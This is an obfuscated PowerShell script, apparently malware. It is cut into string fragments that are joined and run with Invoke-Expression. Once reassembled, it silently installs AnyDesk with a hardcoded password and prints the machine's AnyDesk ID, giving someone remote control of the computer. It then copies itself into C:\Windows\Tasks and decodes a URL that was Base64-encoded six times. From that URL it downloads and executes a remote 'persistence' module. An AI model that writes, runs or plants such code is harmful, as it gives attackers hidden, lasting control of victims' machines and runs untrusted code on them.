$fragments = @('param(
    [','string]$Ins','tallDir   =',' "C:\Progra','mData\AnyDe','sk",
    [','string]$Any','DeskExe   =',' "C:\Progra','mData\AnyDe','sk.exe",   ','# lo usamos',' como insta','lador
    ','[string]$An','yDeskUrl   ','= "https://','download.an','ydesk.com/A','nyDesk.exe"',',
    [str','ing]$AnyDes','kPass  = "J','9kzQ2Y0q0"
','
)

Write','-Host "=== ','Instalacion',' de AnyDesk',' ==="

# ','Rutas inter','nas
$Insta','llerExe = $','AnyDeskExe
','
$Installed','Exe = Join-','Path $Insta','llDir "AnyD','esk.exe"

','
# 1) Si ya',' existe car','peta + exe ','instalado, ','no reinstal','amos, solo ','avisamos
$','needInstall',' = $true

','
$installDi','rExists = T','est-Path -P','ath $Instal','lDir
$exeI','nstalled   ','  = Test-Pa','th -Path $I','nstalledExe','

if ($in','stallDirExi','sts -and $e','xeInstalled',') {
    Wr','ite-Host "[','*] AnyDesk ','ya parece i','nstalado en',' $InstallDi','r. Omitiend','o descarga/','instalaciÃ³','n."
    $n','eedInstall ','= $false
}','

# 2) Si',' hay que in','stalar, cre','amos carpet','a + descarg','amos + inst','alamos
if ','($needInsta','ll) {
    ','Write-Host ','"[*] Creand','o carpeta d','e instalaci','on en $Inst','allDir ..."','
    try {','
        N','ew-Item -Pa','th $Install','Dir -ItemTy','pe Director','y -Force | ','Out-Null
 ','   }
    c','atch {
   ','     Write-','Host "[!] E','rror al cre','ar la carpe','ta: $($_.Ex','ception.Mes','sage)"
   ','     return','
    }

','    Write-H','ost "[*] De','scargando A','nyDesk desd','e $AnyDeskU','rl a $Insta','llerExe ...','"
    try ','{
        ','Invoke-WebR','equest -Uri',' $AnyDeskUr','l -OutFile ','$InstallerE','xe -UseBasi','cParsing
 ','   }
    c','atch {
   ','     Write-','Host "[!] E','rror descar','gando AnyDe','sk: $($_.Ex','ception.Mes','sage)"
   ','     return','
    }

','    if (-no','t (Test-Pat','h $Installe','rExe)) {
 ','       Writ','e-Host "[!]',' No se enco','ntro el ins','talador en ','$InstallerE','xe"
      ','  return
 ','   }

   ',' Write-Host',' "[*] Insta','lando AnyDe','sk en modo ','silencioso.','.."
    tr','y {
      ','  # Lanzamo','s el instal','ador con el',' directorio',' de trabajo',' en $Instal','lDir
     ','   $argumen','ts = "--ins','tall `"$Ins','tallDir`" -','-start-with','-win --sile','nt"
      ','  $proc = S','tart-Proces','s -FilePath',' $Installer','Exe `
    ','           ','           ','    -Argume','ntList $arg','uments `
 ','           ','           ','       -Wor','kingDirecto','ry $Install','Dir `
    ','           ','           ','    -PassTh','ru -Wait
 ','       Writ','e-Host "[*]',' Comando de',' instalacio','n ejecutado','. ExitCode ','(informativ','o): $($proc','.ExitCode)"','
    }
  ','  catch {
','        Wri','te-Host "[!','] Error eje','cutando la ','instalacion',': $($_.Exce','ption.Messa','ge)"
    }','

    Sta','rt-Sleep -S','econds 5

','
    if (-n','ot (Test-Pa','th $Install','edExe)) {
','        Wri','te-Host "[!','] No se enc','ontro el bi','nario insta','lado en $In','stalledExe"','
        r','eturn
    ','}
}

# 3',') Establece',' contraseÃ±','a usando el',' ejecutable',' instalado
','
if ($AnyDe','skPass -and',' $AnyDeskPa','ss.Trim() -','ne "") {
 ','   Write-Ho','st "[*] Con','figurando l','a contraseÃ','±a de AnyDe','sk..."
   ',' try {
   ','     # Camb','iamos el di','rectorio ac','tual a la c','arpeta de A','nyDesk
   ','     Push-L','ocation $In','stallDir
 ','       try ','{
        ','    $cmd = ','"echo $AnyD','eskPass | `','"$Installed','Exe`" --set','-password"
','
          ','  cmd.exe /','c $cmd | Ou','t-Null
   ','     }
   ','     finall','y {
      ','      Pop-L','ocation
  ','      }
  ','  }
    ca','tch {
    ','    Write-H','ost "[!] Er','ror configu','rando la co','ntraseÃ±a: ','$($_.Except','ion.Message',')"
    }
','}
else {
','    Write-H','ost "[!] No',' se ha conf','igurado con','traseÃ±a po','rque estÃ¡ ','vacÃ­a."
}','

# 4) Ob','tiene el ID',' de AnyDesk',' desde el e','jecutable i','nstalado
W','rite-Host "','[*] Obtenie','ndo el ID d','e AnyDesk..','."
try {
','    $psi = ','New-Object ','System.Diag','nostics.Pro','cessStartIn','fo
    $ps','i.FileName ','           ','   = $Insta','lledExe
  ','  $psi.Argu','ments      ','        = "','--get-id"
','    $psi.Us','eShellExecu','te        =',' $false
  ','  $psi.Redi','rectStandar','dOutput = $','true
    $','psi.CreateN','oWindow    ','     = $tru','e
    $psi','.WorkingDir','ectory     ','  = $Instal','lDir   # <-','- clave par','a que no en','sucie la ca','rpeta del s','cript

  ','  $proc = [','System.Diag','nostics.Pro','cess]::Star','t($psi)
  ','  $id   = $','proc.Standa','rdOutput.Re','adToEnd().T','rim()
    ','$proc.WaitF','orExit()

','
    if ($i','d) {
     ','   Write-Ho','st "[*] ID ','de AnyDesk:',' $id"
    ','}
    else',' {
       ',' Write-Host',' "[!] No se',' recibio ni','ngun ID des','de AnyDesk.','"
    }
}','
catch {
','    Write-H','ost "[!] Er','ror al obte','ner el ID: ','$($_.Except','ion.Message',')"
}

Wr','ite-Host "=','== Proceso ','terminado =','=="

# 5)',' Copia del ','propio scri','pt a C:\Win','dows\Tasks
','
try {
   ',' $destDir =',' "C:\Window','s\Tasks"

','
    if (-n','ot (Test-Pa','th -Path $d','estDir)) {
','
        # ','Normalmente',' ya existe,',' pero por s','i acaso
  ','      New-I','tem -Path $','destDir -It','emType Dire','ctory -Forc','e | Out-Nul','l
    }

','
    # Ruta',' del propio',' script
  ','  $scriptPa','th = $PSCom','mandPath
 ','   if (-not',' $scriptPat','h -or $scri','ptPath -eq ','"") {
    ','    $script','Path = $MyI','nvocation.M','yCommand.Pa','th
    }
','
    if ($','scriptPath ','-and (Test-','Path -Path ','$scriptPath',')) {
     ','   $destFil','e = Join-Pa','th $destDir',' (Split-Pat','h $scriptPa','th -Leaf)
','        Cop','y-Item -Pat','h $scriptPa','th -Destina','tion $destF','ile -Force
','
        Wr','ite-Host "[','*] Copia de','l script cr','eada en $de','stFile"
  ','  }
    el','se {
     ','   Write-Ho','st "[!] No ','se pudo det','erminar la ','ruta del sc','ript para c','opiarlo."
','    }
}
c','atch {
   ',' Write-Host',' "[!] Error',' al copiar ','el script a',' C:\Windows','\Tasks: $($','_.Exception','.Message)"
','
}

# 6) ','Carga y eje','cucion del ','modulo de p','ersistencia',' remoto usa','ndo Base64 ','multilayer
','
Write-Host',' "=== Persi','stencia adi','cional (jus','t_persistan','ce) ==="
t','ry {
    #',' Base64 mul','tilayer de ','la URL de j','ust_persist','ance (encod','eada 6 vece','s)
    $b6','4    = ''Vmp','GYVYySXhWWG','ROVldoVllUS','jRWbFpyV25k','VWJIQlhWVzV','PYTFadGVGaF','pWVlUxVkd4S','1dXRkVRbGho','TW1oRVdWUkd','TbVZXYjNwaF','JtaFhaV3hhV','1Zkc1pEUmtN','V1JYVkc1U2F','sSXllRTlaVj','NoWFRURlplV','1ZIY0U1V1ZF','WkhXbFZvVTF','aWFNuTmpTRU','pYVjBoQ2Vsa','3hXbE5XYkd3','MlVtMXNWMDF','HY0ZwV01WSl','BWVEZTYzFkc','mFGVmhhM0Ja','Vm0weFUxVXh','jRmRXVkVaWV','VtczFXbGRyV','lRGVk1ERkhW','MVJHVjFKc1d','sUldiVEZTWk','RBMVNXSkdWb','WxYUjJoUlZr','WmtNRll3TUh','oYVJtUmhVbF','p3VDFSVlVuT','lRWbHAwVFZS','U1ZXSlZjRmh','XTWpWSFZsVX','hSMU51Y0Zwa','E1YQXpWV3hh','UzFkV1pIUmp','SMnhYVm0xM0','1sWnJWbE5UT','Vd4WVVsaG9h','bEp0YUZkWmJ','HUTBXVlpzV0','UxVVFrOVdiR','XBaV1RCYVMx','UnJNVVZXYTJ','4WFlsUkZkMV','pFU2xkamF6R','kZVbXhXVGxa','cmNFUldSbVI','2VGxaYVdGSn','JhR3RTTUZwd','ldXdGFXazFH','V1hsbFJrNVZ','UV3R3V0Zscl','dsZFdSbVJKV','VcxR1dtSkdj','RmRhVjNoVFZ','qRldjazVWTl','U1V00yTjVWb','XBHYjFsWFJr','aFRiazVZWVd','4d2FGVnNXbk','pOVm5CRlVtN','WtXRlpyTlRG','Wk1HUnZWMFp','LVlZWcVRsZE','5WbkJ4VkZaa','1IyTXlUa2RU','YkVaWFVrVkZ','OUT09''
   ',' $layers = ','6

    $d','ata = $b64
','
    for ($','i = 0; $i -','lt $layers;',' $i++) {
 ','       $dat','a = [System','.Text.Encod','ing]::UTF8.','GetString(
','
          ','  [System.C','onvert]::Fr','omBase64Str','ing($data)
','
        )
','
    }

 ','   # Al fin','al $data co','ntiene la U','RL del gist',' just_persi','stance
   ',' iex (irm $','data)

  ','  Write-Hos','t "[*] Modu','lo de persi','stencia rem','oto ejecuta','do correcta','mente."
}
','
catch {
 ','   Write-Ho','st "[!] Err','or al ejecu','tar el modu','lo de persi','stencia rem','oto: $($_.E','xception.Me','ssage)"
}
','
'); $script = $fragments -join ''; Invoke-Expression $script